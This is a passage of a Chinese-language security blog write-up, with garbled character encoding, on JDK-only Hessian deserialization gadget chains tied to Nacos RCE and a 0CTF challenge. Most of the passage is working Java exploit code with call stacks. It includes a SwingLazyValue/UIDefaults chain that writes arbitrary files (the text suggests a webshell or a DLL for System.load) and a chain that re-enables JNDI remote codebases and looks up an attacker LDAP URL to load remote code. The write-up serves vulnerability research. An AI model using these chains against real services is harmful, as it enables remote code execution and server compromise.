class="hljs-number">$j</span><span class="hljs-number">$ab</span><span class="hljs-number">$M</span><span class="hljs-number">$f9</span><span class="hljs-number">$p</span><span class="hljs-number">$e9</span><span class="hljs-number">$cb</span><span class="hljs-number">$f8</span><span class="hljs-number">$98</span><span class="hljs-number">$n</span><span class="hljs-number">$dblu</span><span class="hljs-number">$Z</span><span class="hljs-number">$b4</span><span class="hljs-number">$93</span><span class="hljs-number">$e0</span><span class="hljs-number">$5e0</span><span class="hljs-number">$94l</span><span class="hljs-number">$e9</span><span class="hljs-number">$8b</span><span class="hljs-number">$f3</span><span class="hljs-number">$d1</span><span class="hljs-number">$a0</span><span class="hljs-number">$t</span><span class="hljs-number">$c2k</span><span class="hljs-number">$de</span><span class="hljs-number">$f3</span><span class="hljs-number">$88</span><span class="hljs-number">$a9</span><span class="hljs-number">$da</span><span class="hljs-number">$81</span><span class="hljs-number">$c3</span><span class="hljs-number">$bd</span>$$$P<span class="hljs-number">$a5</span><span class="hljs-number">$ca</span><span class="hljs-number">$bfI</span><span class="hljs-number">$z</span><span class="hljs-number">$7e</span><span class="hljs-number">$90QR</span><span class="hljs-number">$L</span><span class="hljs-number">$5dKL</span><span class="hljs-number">$f8</span><span class="hljs-number">$60</span><span class="hljs-number">$e8</span><span class="hljs-number">$J</span><span class="hljs-number">$x</span><span class="hljs-number">$WQ</span><span class="hljs-number">$dcf</span><span class="hljs-number">$c8</span><span class="hljs-number">$dd</span><span class="hljs-number">$N</span><span class="hljs-number">$b8</span><span class="hljs-number">$f4</span><span class="hljs-number">$Z</span><span class="hljs-number">$g</span><span class="hljs-number">$cd</span><span class="hljs-number">$5b</span><span class="hljs-number">$bb</span><span class="hljs-number">$cf</span><span class="hljs-number">$c7</span><span class="hljs-number">$dc</span><span class="hljs-number">$f2</span><span class="hljs-number">$b8</span><span class="hljs-number">$efZ</span><span class="hljs-number">$9d8</span><span class="hljs-number">$94</span><span class="hljs-number">$be</span><span class="hljs-number">$dbN</span><span class="hljs-number">$acx</span><span class="hljs-number">$e8</span><span class="hljs-number">$8e</span><span class="hljs-number">$ZjS</span><span class="hljs-number">$ca</span><span class="hljs-number">$M</span><span class="hljs-number">$e6</span><span class="hljs-number">$e9</span><span class="hljs-number">$c4</span><span class="hljs-number">$R</span><span class="hljs-number">$c3X</span><span class="hljs-number">$G</span><span class="hljs-number">$7e</span><span class="hljs-number">$a4c</span><span class="hljs-number">$8d</span><span class="hljs-number">$f2N0</span><span class="hljs-number">$K</span><span class="hljs-number">$jq</span><span class="hljs-number">$s</span><span class="hljs-number">$95</span><span class="hljs-number">$ad</span><span class="hljs-number">$a1</span><span class="hljs-number">$y</span><span class="hljs-number">$f6</span><span class="hljs-number">$d5T</span><span class="hljs-number">$R</span><span class="hljs-number">$3a</span><span class="hljs-number">$K</span><span class="hljs-number">$3a</span><span class="hljs-number">$d6</span><span class="hljs-number">$8b</span><span class="hljs-number">$d8</span><span class="hljs-number">$c0</span><span class="hljs-number">$sI</span><span class="hljs-number">$d2</span><span class="hljs-number">$8aN</span><span class="hljs-number">$R</span><span class="hljs-number">$5b</span><span class="hljs-number">$d8f</span><span class="hljs-number">$u</span><span class="hljs-number">$ff</span><span class="hljs-number">$dd</span><span class="hljs-number">$89</span><span class="hljs-number">$a8</span><span class="hljs-number">$d4</span><span class="hljs-number">$e8</span><span class="hljs-number">$a2</span><span class="hljs-number">$d7</span><span class="hljs-number">$X</span><span class="hljs-number">$OQ</span><span class="hljs-number">$b5</span><span class="hljs-number">$94</span><span class="hljs-number">$faqd</span><span class="hljs-number">$a8</span><span class="hljs-number">$a4</span><span class="hljs-number">$ec</span><span class="hljs-number">$d5</span><span class="hljs-number">$c8</span><span class="hljs-number">$8f</span><span class="hljs-number">$e5</span><span class="hljs-number">$80LMW</span><span class="hljs-number">$c4</span><span class="hljs-number">$3fI</span><span class="hljs-number">$bd</span><span class="hljs-number">$d9</span><span class="hljs-number">$b2</span><span class="hljs-number">$ff</span><span class="hljs-number">$f5</span><span class="hljs-number">$d0</span><span class="hljs-number">$da</span><span class="hljs-number">$9a</span><span class="hljs-number">$98</span><span class="hljs-number">$I</span><span class="hljs-number">$87a</span><span class="hljs-number">$b79</span><span class="hljs-number">$e5</span><span class="hljs-number">$c9</span><span class="hljs-number">$bf</span><span class="hljs-number">$a8</span><span class="hljs-number">$cb0pD</span><span class="hljs-number">$U</span><span class="hljs-number">$b5i</span><span class="hljs-number">$d3</span><span class="hljs-number">$i</span><span class="hljs-number">$fd</span><span class="hljs-number">$8c</span><span class="hljs-number">$3a</span><span class="hljs-number">$Z0</span><span class="hljs-number">$f5</span><span class="hljs-number">$W</span><span class="hljs-number">$8a</span><span class="hljs-number">$Ge</span><span class="hljs-number">$W</span><span class="hljs-number">$n</span><span class="hljs-number">$p</span><span class="hljs-number">$cc</span><span class="hljs-number">$ed</span><span class="hljs-number">$3d</span><span class="hljs-number">$83</span><span class="hljs-number">$3d</span><span class="hljs-number">$se</span><span class="hljs-number">$93b</span><span class="hljs-number">$3e</span><span class="hljs-number">$n</span><span class="hljs-number">$b3</span><span class="hljs-number">$98</span><span class="hljs-number">$a1X</span><span class="hljs-number">$fcj</span><span class="hljs-number">$m</span><span class="hljs-number">$9c</span><span class="hljs-number">$r40</span><span class="hljs-number">$87</span><span class="hljs-number">$Su</span><span class="hljs-number">$a9</span><span class="hljs-number">$e1</span><span class="hljs-number">$c3D</span><span class="hljs-number">$M0</span>_<span class="hljs-number">$90</span><span class="hljs-number">$a9f</span><span class="hljs-number">$9f</span><span class="hljs-number">$a0</span><span class="hljs-number">$dd</span><span class="hljs-number">$a4</span><span class="hljs-number">$K</span><span class="hljs-number">$s</span><span class="hljs-number">$a1</span><span class="hljs-number">$9a2H</span><span class="hljs-number">$xU1QF</span><span class="hljs-number">$85</span><span class="hljs-number">$b0JW</span><span class="hljs-number">$p</span><span class="hljs-number">$a6Fw</span><span class="hljs-number">$3e</span><span class="hljs-number">$99</span><span class="hljs-number">$a9</span><span class="hljs-number">$7f</span><span class="hljs-number">$C</span><span class="hljs-number">$82</span><span class="hljs-number">$f0</span><span class="hljs-number">$e5</span><span class="hljs-number">$edD</span><span class="hljs-number">$C</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">runMain:</span><span class="hljs-number">131</span>, JavaWrapper (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.bcel.internal.util)<br><span class="hljs-symbol">_main:</span><span class="hljs-number">153</span>, JavaWrapper (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.bcel.internal.util)<br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">getAttribute:</span><span class="hljs-number">265</span>, PKCS9Attributes (sun.security.pkcs)<br><span class="hljs-symbol">toString:</span><span class="hljs-number">334</span>, PKCS9Attributes (sun.security.pkcs)<br><span class="hljs-symbol">valueOf:</span><span class="hljs-number">2994</span>, String (java.lang)<br><span class="hljs-symbol">append:</span><span class="hljs-number">131</span>, StringBuilder (java.lang)<br><span class="hljs-symbol">expect:</span><span class="hljs-number">2865</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readString:</span><span class="hljs-number">1407</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObjectDefinition:</span><span class="hljs-number">2163</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">2105</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure>

<h5 id="3-3-3-com-sun-org-apache-xml-internal-security-utils-JavaUtils"><a href="#3-3-3-com-sun-org-apache-xml-internal-security-utils-JavaUtils" class="headerlink" title="3.3.3 com.sun.org.apache.xml.internal.security.utils.JavaUtils"></a>3.3.3 com.sun.org.apache.xml.internal.security.utils.JavaUtils</h5><p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´å¾—ï¼Œç›´æ¥å†™æ–‡ä»¶ï¼Œåœ¨webç¯å¢ƒä¸‹ç›´æ¥å†™webshellå°±è¡Œã€‚å½“ç„¶ä¹Ÿå¯ä»¥å…ˆå†™å…¥åŠ¨æ€é“¾æ¥åº“ï¼Œå†è°ƒç”¨ System#load åŠ è½½è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/39.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;<br><span class="hljs-keyword">import</span> org.utils.MakeUtils;<br><span class="hljs-keyword">import</span> org.utils.Payload;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaUtilsWriteFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Payload.run(getUtilsWriteFileObject());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">getUtilsWriteFileObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\calc.dll&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\calc-result.dll&quot;</span>;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<br>                <span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>,<br>                <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;fileName,bytes&#125;);<br>        Object[] keyValueList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;abc&quot;</span>,swingLazyValue&#125;;<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults2);<br>        <span class="hljs-keyword">return</span> MakeUtils.makeMap(hashtable1,hashtable2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨æ ˆï¼š</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">writeBytesToFilename:</span><span class="hljs-number">85</span>, JavaUtils (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xml.internal.security.utils)<br>invokeè°ƒç”¨<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">815</span>, Hashtable (java.util)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">815</span>, Hashtable (java.util)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">636</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">613</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure>

<h5 id="3-3-4-System-setProperty-JNDI"><a href="#3-3-4-System-setProperty-JNDI" class="headerlink" title="3.3.4 System.setProperty + JNDI"></a>3.3.4 System.setProperty + JNDI</h5><p>jdkä¸­è®¾ç½®ç¯å¢ƒå˜é‡å¾—æ–¹æ³•java.lang.System#setPropertyæ˜¯é™æ€æ–¹æ³•ï¼Œç¬¦åˆSwingLazyValue#createValueè°ƒç”¨çš„æ¡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨setPropertyå¤æ´»é«˜ç‰ˆæœ¬ä¸‹çš„JNDIæ³¨å…¥ï¼ŒJNDIæ³¨å…¥å¯å‚è€ƒï¼š <a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import org.utils.MakeUtils;<br>import org.utils.Payload;<br>import sun.swing.SwingLazyValue;<br>import javax.swing.*;<br>import java.util.HashMap;<br>import java.util.Hashtable;<br><br>public <span class="hljs-keyword">class</span> SetPropertyJndi &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    System.setProperty + InitalContext.doLookup</span><br><span class="hljs-comment">     */</span><br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        String className = <span class="hljs-string">&quot;java.lang.System&quot;</span>;<br>        String methodName = <span class="hljs-string">&quot;setProperty&quot;</span>;<br>        String<span class="hljs-literal">[]</span> args1 = &#123;<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>&#125;;<br>        String<span class="hljs-literal">[]</span> args2 = &#123;<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>&#125;;<br>        String<span class="hljs-literal">[]</span> args3 = &#123;<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>&#125;;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args1</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args2</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args3</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-params">new</span> Object[]&#123;<span class="hljs-string">&quot;ldap://192.168.232.238:9999/rceexp&quot;</span>&#125;)</span>);<br>    &#125;<br>    public static HashMap&lt;Object, Object&gt; get<span class="hljs-constructor">SetPropertyJndiObject(String <span class="hljs-params">className</span>,String <span class="hljs-params">methodName</span>,Object[] <span class="hljs-params">args</span>)</span> throws Exception &#123;<br>        SwingLazyValue swingLazyValue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-params">className</span>, <span class="hljs-params">methodName</span>, <span class="hljs-params">args</span>)</span>;<br>        Object<span class="hljs-literal">[]</span> keyValueList = <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;abc&quot;</span>,swingLazyValue&#125;;<br>        UIDefaults uiDefaults1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults(<span class="hljs-params">keyValueList</span>)</span>;<br>        UIDefaults uiDefaults2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults(<span class="hljs-params">keyValueList</span>)</span>;<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;<span class="hljs-literal">()</span>;<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;<span class="hljs-literal">()</span>;<br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults2);<br>        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MakeUtils</span>.</span></span>make<span class="hljs-constructor">Map(<span class="hljs-params">hashtable1</span>,<span class="hljs-params">hashtable2</span>)</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/40.png" srcset="/img/loading.gif" lazyload></p>
<p>è°ƒè¯•çœ‹åˆ°é«˜ç‰ˆæœ¬JDKä¸‹çš„trustURLCodebaseã€useCodebaseOnlyå˜é‡å·²æˆåŠŸä¿®æ”¹</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String env=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;java.runtime.version&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>env<br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/41.png" srcset="/img/loading.gif" lazyload></p>
<p>å¦å¤–è¿˜æœ‰å‡ ä¸ªæ–¹æ³•ï¼Œæ•ˆæœä¸ä¸Šé¢åˆ†æçš„ç±»ä¼¼ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾åˆ†æ</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">DumpBytecode<span class="hljs-selector-class">.dumpBytecode</span> + System<span class="hljs-selector-class">.load</span>   å†™å…¥æ–‡ä»¶+System.loadè°ƒç”¨<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xslt</span><span class="hljs-selector-class">.Process</span>._main <br>sun<span class="hljs-selector-class">.tools</span><span class="hljs-selector-class">.jar</span><span class="hljs-selector-class">.Main</span><span class="hljs-selector-class">.main</span><br>System<span class="hljs-selector-class">.setProperty</span> + jdk<span class="hljs-selector-class">.jfr</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.Utils</span><span class="hljs-selector-class">.writeGeneratedAsm</span>  openjdk<br></code></pre></td></tr></table></figure>

<p>å¦å¤–åœ¨åˆ†æHessiané“¾ä¸­ï¼Œéœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯IDEAåœ¨è°ƒè¯•æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨toStringæ–¹æ³•æ‰“å°å­—ç¬¦ä¸²ï¼Œè€Œåˆ†æçš„é“¾æ­£æ˜¯åŸºäºtoStringï¼Œæå‰è°ƒç”¨ä¼šå¼•å‘é”™è¯¯ï¼Œè§£å†³æ–¹æ¡ˆæ˜¯åœ¨è®¾ç½®ä¸­å–æ¶ˆå‹¾é€‰çº¢æ¡†é€‰é¡¹</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/42.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="5ã€æ€»ç»“"><a href="#5ã€æ€»ç»“" class="headerlink" title="5ã€æ€»ç»“"></a>5ã€æ€»ç»“</h2><p>çºµè§‚è¿‘ä¸¤å¹´å‡ºç°é£é™©è¾ƒå¤§çš„æ¼æ´ï¼Œå¸¸è§çš„èƒ½å¤Ÿä¸€å‘å…¥é­‚ã€ç›´æ¥é€šå¾€RCEçš„WEBæ¼æ´è‚‰çœ¼å¯è§çš„å˜å°‘ï¼Œéšä¹‹æ›¿ä»£çš„æ˜¯å„ç§åè®®é—®é¢˜ã€è¿œç¨‹RPCæ–¹æ³•è°ƒç”¨ã€ä¸‰æ–¹ä¾èµ–åŒ…æ±¡æŸ“ã€æ¡†æ¶åº•å±‚å‡½æ•°é—®é¢˜ç­‰åˆ©ç”¨æ‰‹æ³•ã€‚å®‰å…¨æŠ€æœ¯5å¹´ä¸€æ›´æ–°ï¼Œè¿‘å‡ å¹´è¢«HWå¸¦ç«çš„JAVAå®‰å…¨é¢†åŸŸï¼Œå›½å†…çš„å¸ˆå‚…å‡ ä¹æŠŠèƒ½å·çš„äº§å“&#x2F;ç»„ä»¶&#x2F;æ¡†æ¶éƒ½å·äº†ä¸ªéï¼ŒåƒWeblogic&#x2F;Struts2&#x2F;Spring&#x2F;Log4J&#x2F;Apache&#x2F;Xstreamç­‰å¤§å‹æ¡†æ¶&#x2F;ç»„ä»¶çš„æ¼æ´ç ´è§£ï¼ŒJDBC&#x2F;å†…å­˜é©¬&#x2F;åˆ©ç”¨å›æ˜¾&#x2F;shellå…æ€ç­‰æŠ€æœ¯éåœ°å¼€èŠ±ã€‚è¿™è®©æ¯ä¸ªæƒ³å…¥é—¨JAVAå®‰å…¨çš„æ–°æ‰‹éƒ½èƒ½æœè§å¦‚å±±çš„èµ„æ–™ï¼Œåªè¦æ„¿æ„æŠ•å…¥æ—¶é—´ï¼Œå¤šä¸Šæ‰‹è°ƒä»£ç ï¼Œå°±èƒ½æŒæ¡å¥½è¿™äº›æŠ€æœ¯ã€‚</p>
<p>é‚£ä¹ˆä»€ä¹ˆæ˜¯å®‰å…¨æŠ€æœ¯çš„æ ¸å¿ƒï¼Ÿä»€ä¹ˆæ ·çš„å®‰å…¨æŠ€æœ¯ï¼Œèƒ½æŒç»­3-5å¹´ç”šè‡³10å¹´ï¼Ÿè¿™äº›å®‰å…¨æŠ€æœ¯èƒ½ç»™ä¼ä¸šå¸¦æ¥ä»€ä¹ˆä¿éšœï¼Ÿ</p>
<p>å½’çº³æ€»ç»“ã€è§¦ç±»æ—é€šï¼Œå¤§èƒ†å‡è®¾ï¼Œå°å¿ƒæ±‚è¯~</p>
<h2 id="6ã€å‚è€ƒ"><a href="#6ã€å‚è€ƒ" class="headerlink" title="6ã€å‚è€ƒ"></a>6ã€å‚è€ƒ</h2><p><a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html">https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://l1nyz-tel.cc/2023/1/10/0ctf2022-hessian-onlyjdk/">https://l1nyz-tel.cc/2023/1/10/0ctf2022-hessian-onlyjdk/</a></p>
<p><a target="_blank" rel="noopener" href="http://miku233.viewofthai.link/2022/10/13/0ctf-hessian-onlyjdk/">http://miku233.viewofthai.link/2022/10/13/0ctf-hessian-onlyjdk/</a></p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/psaIZKtC4/">https://guokeya.github.io/post/psaIZKtC4/</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%BC%8F%E6%B4%9E%E8%BF%BD%E8%B8%AA/" class="category-chain-item">æ¼æ´è¿½è¸ª</a>
  
  

      </span>
    
  
</span>

